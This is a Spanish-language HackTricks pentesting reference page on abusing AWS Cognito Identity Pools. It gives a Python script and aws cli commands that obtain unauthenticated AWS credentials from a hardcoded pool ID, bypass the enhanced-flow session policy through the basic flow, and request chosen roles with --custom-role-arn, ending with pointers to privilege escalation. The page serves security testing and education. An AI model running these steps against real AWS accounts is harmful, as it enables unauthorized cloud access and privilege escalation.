# Piscinas de Identidad de Cognito

<details>

<summary><strong>¡Apoya a HackTricks y obtén beneficios!</strong></summary>

* Si quieres ver tu **empresa anunciada en HackTricks** o si quieres acceder a la **última versión de PEASS o descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop).
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm).

* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>

## Información básica

Con una piscina de identidad, tus usuarios pueden **obtener credenciales temporales de AWS para acceder a los servicios de AWS**, como Amazon S3 y DynamoDB. Las piscinas de identidad admiten usuarios invitados anónimos, así como los siguientes proveedores de identidad que puedes utilizar para autenticar usuarios en las piscinas de identidad:

* Piscinas de usuarios de Amazon Cognito
* Inicio de sesión social con Facebook, Google, Inicio de sesión con Amazon y Inicio de sesión con Apple
* Proveedores de OpenID Connect (OIDC)
* Proveedores de identidad SAML
* Identidades autenticadas por desarrollador

### Cognito Sync

Para generar sesiones de piscina de identidad, primero necesitas **generar un ID de identidad**. Este ID de identidad es la **identificación de la sesión de ese usuario**. Estas identificaciones pueden tener hasta 20 conjuntos de datos que pueden almacenar hasta 1 MB de pares clave-valor.

Esto es **útil para mantener información de un usuario** (que siempre estará utilizando el mismo ID de identidad).

Además, el servicio **cognito-sync** es el servicio que permite **administrar y sincronizar esta información** (en los conjuntos de datos, enviando información en flujos y mensajes SNS...).

## Acceso a roles de IAM

### Sin autenticación

Lo único que un atacante necesita saber para **obtener credenciales de AWS** en una aplicación de Cognito como usuario no autenticado es el **ID de la piscina de identidad**, y este **ID debe estar codificado en el código fuente** de la aplicación web/móvil para que lo utilice. Un ID se ve así: `eu-west-1:098e5341-8364-038d-16de-1865e435da3b` (no se puede obtener por fuerza bruta).

{% hint style="success" %}
El **rol sin autenticación de IAM Cognito creado a través de** se llama por defecto `Cognito_<nombre de la piscina de identidad>Unauth_Role`
{% endhint %}

Si encuentras un ID de piscina de identidad codificado en el código fuente y permite usuarios no autenticados, puedes obtener credenciales de AWS con:
```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
print(f"Not valid id: {id_pool_id}")
exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```
O también puedes usar los siguientes comandos **aws cli**:
```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```
{% hint style="warning" %}
Ten en cuenta que de forma predeterminada, un usuario de Cognito sin autenticar NO TIENE ningún permiso, incluso si se le asignó mediante una política. Verifica la siguiente sección.
{% endhint %}

### Flujo de autenticación mejorado vs básico

La sección anterior siguió el flujo de autenticación mejorado predeterminado. Este flujo establece una política de sesión restrictiva para la sesión del rol IAM generada. Esta política solo permitirá que la sesión use los servicios de esta lista (incluso si el rol tenía acceso a otros servicios).

Sin embargo, hay una forma de evitar esto. Si el grupo de identidades tiene habilitado el "Flujo básico (clásico)", el usuario podrá obtener una sesión utilizando ese flujo que no tendrá esa política de sesión restrictiva.

{% code overflow="wrap" %}
```bash
# Get auth ID
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Get login token
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Use login token to get IAM session creds
## If you don't know the role_arn use the previous enhanced flow to get it
aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::<acc_id>:role/<role_name>" --role-session-name sessionname --web-identity-token <token> --no-sign
```
{% endcode %}

{% hint style="warning" %}
Si recibes este **error**, es porque el **flujo básico no está habilitado (por defecto)**

`An error occurred (InvalidParameterException) when calling the GetOpenIdToken operation: Basic (classic) flow is not enabled, please use enhanced flow.`
{% endhint %}

Teniendo un conjunto de credenciales IAM, debes verificar [a qué acceso tienes](../../#whoami) e intentar [elevar privilegios](../../aws-privilege-escalation/).

### Autenticado

{% hint style="info" %}
Recuerda que los **usuarios autenticados** probablemente tengan **permisos diferentes**, así que si puedes **registrarte dentro de la aplicación**, intenta hacerlo y obtener las nuevas credenciales.
{% endhint %}

También podría haber **roles** disponibles para **usuarios autenticados que acceden al Identity Pool**.

Para esto, es posible que necesites tener acceso al **proveedor de identidad**. Si ese es un **Cognito User Pool**, tal vez puedas abusar del comportamiento predeterminado y **crear un nuevo usuario tú mismo**.

{% hint style="success" %}
El **rol autenticado IAM Cognito creado a través de** se llama por defecto `Cognito_<Nombre del Identity Pool>Auth_Role`
{% endhint %}

De todos modos, el **siguiente ejemplo** espera que ya hayas iniciado sesión en un **Cognito User Pool** utilizado para acceder al Identity Pool (no olvides que también se pueden configurar otros tipos de proveedores de identidad).

<pre class="language-bash"><code class="lang-bash">aws cognito-identity get-id \
--identity-pool-id &#x3C;identity_pool_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;TU_USER_POOL_ID>=&#x3C;ID_TOKEN>

# Obtén el identity_id de la respuesta del comando anterior
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;TU_USER_POOL_ID>=&#x3C;ID_TOKEN>


# En el IdToken puedes encontrar los roles a los que un usuario tiene acceso debido a los grupos del User Pool
# Usa --custom-role-arn para obtener credenciales para un rol específico
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
<strong>    --custom-role-arn &#x3C;role_arn> \
</strong>    --logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;TU_USER_POOL_ID>=&#x3C;ID_TOKEN>
</code></pre>

{% hint style="warning" %}
Es posible **configurar diferentes roles IAM dependiendo del proveedor de identidad** con el que el usuario inicie sesión o incluso solo **dependiendo del usuario** (usando claims). Por lo tanto, si tienes acceso a diferentes usuarios a través del mismo o diferentes proveedores, podría valer la pena **iniciar sesión y acceder a los roles IAM de todos ellos**.
{% endhint %}

<details>

<summary><strong>¡Apoya a HackTricks y obtén beneficios!</strong></summary>

* Si quieres ver tu **empresa anunciada en HackTricks** o si quieres acceder a la **última versión de PEASS o descargar HackTricks en PDF**, ¡consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>
